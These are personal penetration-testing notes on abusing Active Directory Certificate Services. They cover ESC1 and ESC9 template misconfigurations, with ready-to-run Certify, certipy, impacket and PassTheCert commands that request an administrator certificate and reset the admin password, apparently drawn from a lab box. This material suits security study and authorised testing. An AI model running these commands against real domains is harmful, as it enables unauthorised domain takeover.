+++
title = "Pentest - Active Directory - Certificate Services"
author = ["svejk"]
tags = ["cert", "activeDirectory", "pentest"]
draft = false
+++

## Active Directory Certificate Services {#active-directory-certificate-services}

[social.technet.microsoft.com](https://social.technet.microsoft.com/wiki/contents/articles/3063.certutil-examples-for-managing-active-directory-certificate-services-ad-cs-from-the-command-line.aspx)

Active Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. [medium - shaun whorton](https://medium.com/@shaunwhorton/active-directory-certificate-services-domain-dominance-9ba2c54988d7)


## Abusing misconfigured certificate templates {#abusing-misconfigured-certificate-templates}

Use `Certify.exe` to enumerate Certificate Services [GhostPack/Certify](https://github.com/GhostPack/Certify)

```sh
PS C:\ > .\Certify.exe find /vulnerable
```

{{< figure src="/images/certify1.png" >}}

Here's an example of a vulnerable cert template, which is used for client authentication.  Domain Users have enrollments rights, and they're also permitted to supply the subject (msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT)

{{< figure src="/images/certify2.png" >}}


### Python {#python}

<https://github.com/ly4k/Certipy>

[specterops - certified pre-owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)


## Examples {#examples}


### ESC1 vulnerability {#esc1-vulnerability}

{{< figure src="/images/certify3.png" >}}

-   Client Authentication: True - an issued certificate can be used for client authentication purposes.

-   Enrollee Supplies Subject : True - a Subject Alternative Name can be specified which allows a certificate to be requested as another user on the system (e.g., administrator).

-   Requires Manager Approval : False - a requested certificate doesn't require approval from a user with certificate manager permissions.

-   Enrollment Rights : Domain\Domain Computers - this gives low-level users the ability to request a certificate by simply joining a computer to the domain.

User happens to be able to join machines to the domain -- from **whoami /priv**

```sh
  Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

Use impacket to join a computer to the domain:

```sh
addcomputer.py 'domain/<user>:<pw>' -method LDAPS -computer-name 'PC01' -computer-pass 'Welcome123'
```

Use <span class="underline">certipy</span> to request cert for admin

```sh
certipy req -username 'PC01$' -password 'Welcome123' -ca AUTHORITY-CA -target <ip> -template '' -upn 'administrator@domain'
```

Can try to auth

```sh
certipy auth -pfx administrator.pfx
```

In this case there's a kerberos session error -&gt; authenticate with LDAP instead of kerberos.  Use [PassTheCert](https://github.com/AlmondOffSec/PassTheCert?source=post_page-----8d6bbd770266--------------------------------) -- first convert

```sh
certipy cert -pfx administrator.pfx -nokey -out user.crt
```

```sh
certipy cert -pfx administrator.pfx -nocert -out user.key
```

Then, eg, change the admin password:

```sh
python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain <domain> -dc-ip <ip> -target administrator -new-pass
```


### Using `netexec` {#using-netexec}

Enumerate services

```shell { linenos=true, linenostart=1 }
nxc ldap certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M adcs
```

Determine vulnerabilities

```shell { linenos=true, linenostart=1 }
certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
```


#### ESC9 {#esc9}

Can modify the UPN of users.

```shell { linenos=true, linenostart=1 }
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

Then request a certificate

```shell { linenos=true, linenostart=1 }
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template
CertifiedAuthentication -debug
```

And change the UPN back:

```shell { linenos=true, linenostart=1 }
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

[masky](https://z4ksec.github.io/posts/masky-release-v0.0.3/)
